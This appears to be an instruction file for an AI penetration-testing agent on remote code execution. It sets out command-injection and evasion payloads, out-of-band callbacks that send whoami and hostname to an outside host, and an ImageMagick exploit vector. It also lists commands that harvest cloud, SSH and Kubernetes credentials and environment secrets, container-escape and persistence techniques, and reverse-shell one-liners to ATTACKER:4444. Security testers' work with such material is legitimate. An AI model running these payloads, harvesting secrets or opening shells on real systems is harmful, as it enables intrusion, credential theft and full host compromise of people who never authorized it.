---
name: rce
description: RCE testing covering command injection, deserialization, template injection, and code evaluation
---

# RCE

Remote code execution leads to full server control when input reaches code execution primitives: OS command wrappers, dynamic evaluators, template engines, deserializers, media pipelines, and build/runtime tooling. Focus on quiet, portable oracles and chain to stable shells only when needed.

## Attack Surface

**Command Execution**
- OS command execution via wrappers (shells, system utilities, CLIs)

**Dynamic Evaluation**
- Template engines, expression languages, eval/vm

**Deserialization**
- Insecure deserialization and gadget chains across languages

**Media Pipelines**
- ImageMagick, Ghostscript, ExifTool, LaTeX, ffmpeg

**SSRF Chains**
- Internal services exposing execution primitives (FastCGI, Redis)

**Container Escalation**
- App RCE to node/cluster compromise via Docker/Kubernetes

## Detection Channels

### Time-Based

**Unix**
- `;sleep 1`, `` `sleep 1` ``, `|| sleep 1`
- Gate delays with short subcommands to reduce noise

**Windows**
- CMD: `& timeout /t 2 &`, `ping -n 2 127.0.0.1`
- PowerShell: `Start-Sleep -s 2`

### OAST

Use `interactsh-client -v` in the sandbox to mint a unique callback
domain (`*.oast.fun`); substitute it for `attacker.tld` below. Each
invocation prints inbound DNS/HTTP hits to stdout in real time.

**DNS**
```bash
nslookup $(whoami).xyz.oast.fun
```

**HTTP**
```bash
curl https://xyz.oast.fun/$(hostname)
```

### Output-Based

**Direct**
```bash
;id;uname -a;whoami
```

**Encoded**
```bash
;(id;hostname)|base64
```

## Key Vulnerabilities

### Command Injection

**Delimiters and Operators**
- Unix: `; | || & && `cmd` $(cmd) $() ${IFS}` newline/tab
- Windows: `& | || ^`

**Argument Injection**
- Inject flags/filenames into CLI arguments (e.g., `--output=/tmp/x`, `--config=`)
- Break out of quoted segments by alternating quotes and escapes
- Environment expansion: `$PATH`, `${HOME}`, command substitution
- Windows: `%TEMP%`, `!VAR!`, PowerShell `$(...)`
- When a shell-free subprocess (`execve`/`subprocess.run([...])`) receives a user-controlled argument, load `argument_injection` to test option smuggling and any separately identified argv or secondary-parser boundary.

**Path and Builtin Confusion**
- Force absolute paths (`/usr/bin/id`) vs relying on PATH
- Use builtins or alternative tools (`printf`, `getent`) when `id` is filtered
- Use `sh -c` or `cmd /c` wrappers to reach the shell

**Evasion**
- Whitespace/IFS: `${IFS}`, `$'\t'`, `<`
- Token splitting: `w'h'o'a'm'i`, `w"h"o"a"m"i`
- Variable building: `a=i;b=d; $a$b`
- Base64 stagers: `echo payload | base64 -d | sh`
- PowerShell: `IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))`

**Cross-language exec-sink table.** Whether a shell metacharacter (`;`, `|`,
`$()`) in a controlled argument runs a second command depends entirely on
whether the call goes through a **shell**. Measured (Node 24, Python 3.14, PHP
8.4, Go 1.26, Ruby 3.3) — inject `SAFE; id` and check for `uid=` in the output:

| Runtime | Shell form → **command chaining works** | Array/exec-file form → arg passed **literally** (no chaining) |
|---|---|---|
| Node | `exec(str)`, `execSync(str)`, `spawn(cmd,{shell:true})` | `execFile("bin",[arg])`, `spawn("bin",[arg])` |
| Python | `subprocess.run(str, shell=True)`, `os.system` | `subprocess.run(["bin",arg])`, `Popen([...])` |
| PHP | `system`/`exec`/`shell_exec`/`passthru`/backticks (string) | `escapeshellarg($arg)` around the value |
| Go | `exec.Command("sh","-c", str)` | `exec.Command("bin", arg)` |
| Ruby | `` `#{x}` ``, `system(str)`, `%x{}` | `system("bin", arg)`, `IO.popen(["bin",arg])` |

The rule: **the array/exec-file form is safe from command *chaining*** — the
`;` is an inert character inside one argv element (measured `literal arg (safe)`
for every language above). So when you see a shell string sink, inject
operators; when you see the array form, chaining is dead — but the argument is
still attacker-controlled, so pivot to **option/operand injection** (a leading
`-`/`--flag`, a response/config file, a subcommand). Load `argument_injection`
for that residual, which is exactly the boundary the array form leaves open.

### Template Injection

Load `ssti` for the full template-injection probe catalog — engine
fingerprinting (`{{7*7}}`/`${7*7}`/`<%= 7*7 %>`), per-engine gadget chains
(Jinja/Twig/Freemarker/Velocity/Thymeleaf/ERB/EJS/Nunjucks), and sandbox
escapes. As an RCE sink it is one of the highest-yield paths: a `{{7*7}}`→`49`
*evaluation* (not literal reflection) is server-side code execution. The
RCE-specific extensions (post-exploitation, shell stabilization, cross-language
exec sinks above) are here; the probe/gadget catalog lives in `ssti`.

### Deserialization and Expression Languages

Load `insecure_deserialization` for the full gadget-chain catalog — Java native
/ Jackson / Fastjson autotype, .NET `BinaryFormatter`/ViewState, PHP
`unserialize`/Phar, Python pickle/PyYAML, Ruby Marshal, and the
ysoserial/phpggc/ysoserial.net tooling. It is the canonical owner; confirm the
sink with an OAST/`URLDNS`-style no-exec callback before any command chain.

Expression languages (OGNL, SpEL, MVEL, JSP EL) reach `Runtime`/`ProcessBuilder`
the same way — SpEL/Thymeleaf specifically is covered in `ssti`; Struts-style
OGNL and standalone EL injection are code-eval sinks that land at the same
execution boundary the RCE-specific material here extends. JNDI/LDAP lookups
(Log4Shell-style) reach code execution through a *different* input path than
deserialization — see the JNDI-pivot discussion in `insecure_deserialization`.

### Media and Document Pipelines

These out-of-process converters are first-class RCE sinks whether reached by
upload or by any input that feeds them. For the version-pinned CVEs
(ImageTragick CVE-2016-3714, Ghostscript `%pipe%` CVE-2023-36664 / `-dSAFER`
CVE-2018-16509) and the upload-delivery angle, load `insecure_file_uploads`.

**ImageMagick/GraphicsMagick**
- policy.xml may limit delegates; still test legacy vectors
```
push graphic-context
fill 'url(https://x.tld/a"|id>/tmp/o")'
pop graphic-context
```

**Ghostscript**
- PostScript in PDFs/PS: `%pipe%id` file operators

**ExifTool**
- Crafted metadata invoking external tools or library bugs

**LaTeX**
- `\write18`/`--shell-escape`, `\input` piping; pandoc filters

**ffmpeg**
- concat/protocol tricks mediated by compile-time flags

### SSRF to RCE

**FastCGI**
- `gopher://` to php-fpm (build FPM records to invoke system/exec)

**Redis**
- `gopher://` write cron/authorized_keys or webroot
- Module load when allowed

**Admin Interfaces**
- Jenkins script console, Spark UI, Jupyter kernels reachable internally

### Container and Kubernetes

**Docker**
- From app RCE, inspect `/.dockerenv`, `/proc/1/cgroup`
- Enumerate mounts and capabilities: `capsh --print`
- Abuses: mounted docker.sock, hostPath mounts, privileged containers
- Write to `/proc/sys/kernel/core_pattern` or mount host with `--privileged`

**Kubernetes**
- Steal service account token from `/var/run/secrets/kubernetes.io/serviceaccount`
- Query API for pods/secrets; enumerate RBAC
- Talk to kubelet on 10250/10255; exec into pods
- Escalate via privileged pods, hostPath mounts, or daemonsets

## Bypass Techniques

**Encoding Differentials**
- URL encoding, Unicode normalization, comment insertion, mixed case
- Request smuggling to reach alternate parsers

**Binary Alternatives**
- Absolute paths and alternate binaries (busybox, sh, env)
- Windows variations (PowerShell vs CMD)
- Constrained language bypasses

## Post-Exploitation

**Reconnaissance and Secret Harvesting** (do this first — the finding's real
impact is what the shell reveals). Order of operations: environment, then config,
then credential files, then container/cloud context. Harvest before you escalate.

Environment variables are the highest-yield first read — build-time `--build-arg`
secrets, `.env` files loaded into the process, and orchestrator-injected values
(Compose, Kubernetes ConfigMaps/Secrets) all land here. PID 1's environment is the
most reliable in a container because it survives child-process spawning:
```bash
env; printenv
cat /proc/1/environ    | tr '\0' '\n'
cat /proc/self/environ | tr '\0' '\n'
```
If these show `UPPERCASE_NAME=...` values (DB URLs, API keys, cloud creds), that is
the credential store — extract every one before doing anything else.

Application config, per framework:
- Python: `os.environ`, Flask `app.config.items()`, Django `django.conf.settings`
- Node.js: `process.env`, the loaded `config` module
- PHP: `$_ENV`, `$_SERVER`, `phpinfo()` if you can reach/write a page
- Ruby: `ENV.to_h`, Rails `Rails.application.credentials`

Credential files — targeted reads beat recursive search:
```bash
cat .env .env.local ~/.aws/credentials ~/.netrc ~/.docker/config.json 2>/dev/null
cat ~/.ssh/id_rsa ~/.ssh/authorized_keys 2>/dev/null
cat ~/.kube/config /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
```

Container context:
```bash
test -f /.dockerenv && echo "[in container]"
cat /proc/1/cgroup                        # runtime + often the container ID
mount | grep -Ei 'docker|overlay'
ls -l /var/run/docker.sock 2>/dev/null    # writable docker.sock = host takeover
```

Cloud metadata: RCE makes the target your pivot into the cloud metadata service —
run the same probes from inside the process. Load `ssrf` for the per-provider
endpoint catalog (`169.254.169.254` / IMDSv2 / GCP / Azure); this is the natural
next step from RCE, not a separate vulnerability class.

Database recon when a connection string is reachable (from the env/config above) —
enumerate for seeded secrets rather than dumping everything:
```bash
sqlite3 <file> .dump                        # SQLite
mysql   ... -e 'SHOW TABLES'                 # MySQL/MariaDB
psql    ... -c '\dt'                         # Postgres
```
Look for tables named `users`, `secrets`, `tokens`, `admin_*`, `licenses` — the
value of interest is often a single seeded row.

Filesystem grep — last resort, slow and noisy; prefer env/config reads first:
```bash
grep -rIn -E '<pattern>' /app /srv /var/www /home /root /opt 2>/dev/null
```

Skip immediately: recursive `find /`, kernel-module inspection, and unfocused
`ps` trawling — they burn turns for little on a web assessment.

**Privilege Escalation**
- `sudo -l`; SUID binaries; capabilities (`getcap -r / 2>/dev/null`)

**Persistence**
- cron/systemd/user services; web shell behind auth
- Plugin hooks; supply chain in CI/CD

**Lateral Movement**
- SSH keys, cloud metadata credentials, internal service tokens

**Shell Stabilization** (only when an interactive shell is actually needed —
prefer OAST + selective reads first). Upgrade a dumb shell to a PTY:
```bash
# on target, whichever interpreter exists:
python3 -c 'import pty;pty.spawn("/bin/bash")'   # or: script -qc /bin/bash /dev/null
# background with Ctrl-Z, then on the attacker's listener:
stty raw -echo; fg
# back on target: export TERM=xterm; stty rows 50 cols 200
```
`socat` gives a full PTY in one step:
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444`.

**Reverse-shell one-liners** (one-shot, not persistence):
```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1               # bash /dev/tcp
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER 4444 >/tmp/f   # no-bash fallback
python3 -c 'import socket,pty,os;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

## Testing Methodology

1. **Identify sinks** - Command wrappers, template rendering, deserialization, file converters, report generators, plugin hooks
2. **Establish oracle** - Timing, DNS/HTTP callbacks, or deterministic output diffs (length/ETag)
3. **Confirm context** - User, working directory, PATH, shell, SELinux/AppArmor, containerization
4. **Map boundaries** - Read/write locations, outbound egress
5. **Progress to control** - File write, scheduled execution, service restart hooks

## Validation

1. Provide a minimal, reliable oracle (DNS/HTTP/timing) proving code execution
2. Show command context (uid, gid, cwd, env) and controlled output
3. Demonstrate persistence or file write under application constraints
4. If containerized, prove boundary crossing attempts (host files, kube APIs) and whether they succeed
5. Keep PoCs minimal and reproducible across runs and transports

## False Positives

- Only crashes or timeouts without controlled behavior
- Filtered execution of a limited command subset with no attacker-controlled args
- Sandboxed interpreters executing in a restricted VM with no IO or process spawn
- Simulated outputs not derived from executed commands

## Impact

- Remote system control under application user; potential privilege escalation to root
- Data theft, encryption/signing key compromise, supply-chain insertion, lateral movement
- Cluster compromise when combined with container/Kubernetes misconfigurations

## Pro Tips

1. Prefer OAST oracles; avoid long sleeps—short gated delays reduce noise
2. When command injection is weak, pivot to file write or deserialization/SSTI paths
3. Treat converters/renderers as first-class sinks; many run out-of-process with powerful delegates
4. For Java/.NET, enumerate classpaths/assemblies and known gadgets; verify with out-of-band payloads
5. Confirm environment: PATH, shell, umask, SELinux/AppArmor, container caps
6. Keep payloads portable (POSIX/BusyBox/PowerShell) and minimize dependencies
7. Document the smallest exploit chain that proves durable impact; avoid unnecessary shell drops

## Tooling

- Reverse-shell listener: `ncat -lvnp 4444` (in the sandbox; `ncat` is the
  netcat variant that ships in the image). Pair with a one-shot shell
  payload only when OAST + selective reads are insufficient — never
  drop a persistent shell when a single targeted command will prove it.

## Summary

RCE is a property of the execution boundary. Find the sink, establish a quiet oracle, and escalate to durable control only as far as necessary. Validate across transports and environments; defenses often differ per code path.
